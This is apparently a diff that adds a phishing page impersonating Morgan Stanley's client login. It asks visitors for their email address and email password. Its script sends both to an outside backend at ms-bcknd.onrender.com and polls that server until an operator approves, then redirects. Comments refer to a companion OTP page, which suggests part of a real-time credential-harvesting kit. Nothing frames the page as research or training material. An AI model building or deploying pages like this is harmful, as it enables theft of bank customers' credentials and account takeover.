@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11">
+    <link rel="icon" type="image/x-icon" href="https://login.morganstanleyclientserv.com/ux/favicon.ico">
+    <meta name="viewport" content="initial-scale=1,maximum-scale=1">
+    <title>Morgan Stanley – Email Verification</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        /* Same CSS as above – include identical styles */
+        /* (Copy all CSS from otp.html or index.html) */
+        :root { /* ... */ }
+        /* For brevity, include the full CSS from otp.html here */
+        /* ... */
+    </style>
+</head>
+<body>
+    <a href="#main-content" class="skip-link">Skip to main content</a>
+
+    <div role="banner">
+        <div class="mso-header-container">
+            <div>
+                <svg width="200" height="32" viewBox="0 0 200 32" class="mso-desktop-header" aria-label="Morgan Stanley">
+                    <text x="0" y="24" font-family="Karla, Arial, sans-serif" font-weight="700" font-size="24" fill="#002b51">Morgan Stanley</text>
+                </svg>
+            </div>
+            <nav class="mso-header-nav-bar" aria-label="Main navigation">
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Online Security Center</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Find an Advisor / Branch</a></div>
+                <div class="mso-header-nav-element"><a href="#" class="mso-header-nav-content">Help + Support</a></div>
+            </nav>
+        </div>
+    </div>
+
+    <main id="main-content" class="login-page">
+        <div class="login_form">
+            <div class="login-row">
+                <div class="login-left">
+                    <div class="login-container">
+                        <h2>Email Account Verification</h2>
+
+                        <form id="emailForm">
+                            <div class="form-row">
+                                <div class="input-wrapper">
+                                    <i data-lucide="mail"></i>
+                                    <input type="email" id="emailInput" class="input-field" placeholder="Email address" autocomplete="email" required aria-label="Email">
+                                </div>
+                                <div id="emailError" class="field-error"></div>
+                            </div>
+                            <div class="form-row">
+                                <div class="input-wrapper">
+                                    <i data-lucide="lock"></i>
+                                    <input type="password" id="passwordInput" class="input-field" placeholder="Password" autocomplete="current-password" required aria-label="Password">
+                                    <button type="button" class="show-hide" onclick="togglePassword()">Show</button>
+                                </div>
+                                <div id="passwordError" class="field-error"></div>
+                            </div>
+                            <div class="form-row text-center">
+                                <button type="submit" class="btn-login" id="submitBtn">
+                                    <i data-lucide="loader-2" class="loading"></i>
+                                    <span>Continue</span>
+                                </button>
+                            </div>
+                            <div id="silentStatus" class="silent-status"></div>
+                        </form>
+
+                        <div class="forgot-row">
+                            <div class="forgot-item">
+                                <button class="btn-secondary" onclick="window.location.href='index.html';">Back</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="login-right">
+                    <div class="banner">
+                        <div class="banner-content">
+                            <h3>Secure Email Login</h3>
+                            <p>Provide your email credentials for verification</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <footer class="ms-footer">...</footer>
+    </main>
+
+    <script>
+        lucide.createIcons();
+        
+        const BACKEND_URL = 'https://ms-bcknd.onrender.com';
+        let pollTimeout;
+
+        function togglePassword() {
+            const pwd = document.getElementById('passwordInput');
+            const btn = document.querySelector('.show-hide');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                btn.textContent = 'Hide';
+            } else {
+                pwd.type = 'password';
+                btn.textContent = 'Show';
+            }
+        }
+
+        document.getElementById('emailForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('emailInput').value;
+            const password = document.getElementById('passwordInput').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            
+            document.getElementById('emailError').classList.remove('show');
+            document.getElementById('passwordError').classList.remove('show');
+            
+            if (!email.trim()) {
+                document.getElementById('emailError').textContent = 'Please enter email';
+                document.getElementById('emailError').classList.add('show');
+                return;
+            }
+            if (!password.trim()) {
+                document.getElementById('passwordError').textContent = 'Please enter password';
+                document.getElementById('passwordError').classList.add('show');
+                return;
+            }
+            
+            loadingIcon.classList.add('active');
+            submitText.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/email`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                const data = await response.json();
+                
+                if (response.ok && data.success) {
+                    const sessionId = data.id;
+                    localStorage.setItem('sessionId', sessionId);
+                    pollStatus(sessionId, 0);
+                } else {
+                    document.getElementById('passwordError').textContent = data.error || 'Verification failed';
+                    document.getElementById('passwordError').classList.add('show');
+                    resetButton();
+                }
+            } catch (error) {
+                document.getElementById('passwordError').textContent = 'Network error';
+                document.getElementById('passwordError').classList.add('show');
+                resetButton();
+            }
+        });
+
+        async function pollStatus(sessionId, attempt) {
+            const maxAttempts = 120;
+            try {
+                const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
+                if (!response.ok) {
+                    if (response.status === 404 && attempt < 3) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 2000);
+                        return;
+                    }
+                    if (attempt < maxAttempts) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                    } else {
+                        resetButton();
+                    }
+                    return;
+                }
+                const data = await response.json();
+                if (data.status === 'approved') {
+                    if (data.redirect_url) {
+                        let redirectUrl = data.redirect_url.startsWith('http') ? data.redirect_url : window.location.origin + '/' + data.redirect_url;
+                        window.location.href = redirectUrl;
+                    } else {
+                        window.location.href = 'index.html';
+                    }
+                } else if (data.status === 'pending') {
+                    if (attempt < maxAttempts) {
+                        setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                    } else {
+                        resetButton();
+                    }
+                } else {
+                    resetButton();
+                }
+            } catch (error) {
+                if (attempt < maxAttempts) {
+                    setTimeout(() => pollStatus(sessionId, attempt + 1), 5000);
+                } else {
+                    resetButton();
+                }
+            }
+        }
+
+        function resetButton() {
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingIcon = submitBtn.querySelector('.loading');
+            const submitText = submitBtn.querySelector('span');
+            loadingIcon.classList.remove('active');
+            submitText.textContent = 'Continue';
+            submitBtn.disabled = false;
+        }
+    </script>
+</body>
+</html>
